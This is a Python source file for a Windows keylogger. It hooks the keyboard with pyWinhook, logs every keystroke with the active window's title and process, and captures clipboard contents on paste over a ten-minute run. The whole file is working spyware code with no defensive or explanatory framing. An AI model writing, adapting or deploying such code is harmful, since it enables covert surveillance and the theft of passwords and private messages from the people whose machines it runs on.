from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO


import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard


TIMEOUT = 60*10



class KeyLogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        # Get the handle to the current foreground window
        hwnd = windll.user32.GetForegroundWindow()
        
        # Get the process ID of the current foreground window
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
        
        # Get the executable name of the process
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        
        # Get the title of the foreground window
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: Unknown window name')

        # Print the process information
        print('\n', process_id, executable.value.decode(), self.current_window)

        # Close handles to avoid resource leaks
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        # If the window has changed, get the new process details
        if event.WindowName != self.current_window:
            self.get_current_process()
        
        # If the key is printable, log it directly
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # Handle special cases like clipboard paste
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                # Log non-printable keys
                print(f'{event.Key}')  
        return True

def run():
    # Redirect stdout to capture the keylogging output
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    
    # Run the keylogger for the specified timeout period
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        
    # Retrieve the log and restore stdout
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
    
if __name__ == '__main__':
    print(run())  # Print the captured log
    print('End.')